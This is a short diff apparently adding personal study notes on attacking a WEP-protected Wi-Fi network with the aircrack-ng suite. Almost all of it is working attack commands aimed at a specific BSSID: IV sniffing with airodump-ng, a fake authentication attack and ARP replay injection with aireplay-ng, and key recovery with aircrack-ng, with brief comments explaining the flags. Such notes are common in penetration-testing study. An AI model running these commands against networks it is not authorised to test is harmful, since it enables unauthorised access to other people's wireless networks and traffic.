@@ -1,4 +1,23 @@
+# ===============  Crack an active WEP network  ====================
+# Sniff the IV
 airodump-ng --bssid 90:8D:78:55:7A:A4 --channel 10 --write basic_wep wlan0
 aircrack-ng basic_wep_wep-01.cap
 
 # use the ASCII or the key without ":"
+
+# ===============  Fake authentication attack  ====================
+# start sniffing the network
+airodump-ng --bssid 90:8D:78:55:7A:A4 --channel 10 --write fake_auth wlan0
+
+# send fake authentiocation to the network
+aireplay-ng --fakeauth 0 -a 90:8D:78:55:7A:A4 -h EA:00:76:3C:CA:EF wlan0
+# a - network bssid
+# h - ifconfig --> unspec first 6 pairs
+
+# send ARP requests for the airodump to capture
+aireplay-ng --arpreplay 0 -b 90:8D:78:55:7A:A4 -h EA:00:76:3C:CA:EF wlan0
+# b - network bssid
+# h - ifconfig --> unspec first 6 pairs
+
+# crack the IV
+aircrack-ng fake_auth-01.cap
